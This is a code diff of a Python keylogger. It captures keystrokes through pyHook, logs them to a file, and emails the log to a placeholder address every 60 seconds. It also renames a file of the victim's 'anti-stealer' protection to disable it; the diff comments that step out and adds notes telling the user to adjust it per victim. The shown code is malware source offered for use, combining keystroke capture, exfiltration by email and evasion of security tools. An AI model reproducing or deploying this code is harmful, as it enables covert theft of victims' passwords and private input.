@@ -1,7 +1,8 @@
 import pyHook, pythoncom, sys, logging, smtplib, threading, time, os
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEText import MIMEText
-os.rename('!0AntiStealerByDarkP1xel32.ASI','!0AntiStealerByDarkP1xel32.ASl')
+#Change the name according to victim's anti-sleaer, uncomment next line to enable
+#os.rename('!0AntiStealerByDarkP1xel32.ASI','!0AntiStealerByDarkP1xel32.ASl')
 file_log = 'samplicense037.txt'
 #=======================TIMER=========================
 import time, traceback
@@ -25,6 +26,7 @@ def SendEmail():
     file("samplicense037.txt").close()
     s.sendmail("your_email_here", "your_email_here", message.as_string()) 
     s.quit()
+# 60 secs, change accordingly
 threading.Thread(target=lambda: every(60, SendEmail)).start()    
 #====================KEYLOGGER========================
 def OnKeyboardEvent(event):
